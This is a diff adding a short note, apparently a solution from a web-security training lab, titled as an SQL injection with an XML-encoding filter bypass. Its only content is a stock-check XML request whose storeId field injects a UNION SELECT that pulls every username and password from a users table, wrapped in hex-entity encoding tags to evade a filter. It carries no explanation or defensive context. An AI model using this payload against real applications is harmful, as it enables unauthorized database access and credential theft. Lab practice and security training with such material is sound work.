@@ -1,0 +1,4 @@
+# SQL injection with filter bypass via XML encoding
+
+
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId><@hex_entities>3 UNION SELECT username||'#' ||password FROM users<@/hex_entities></storeId></stockCheck>
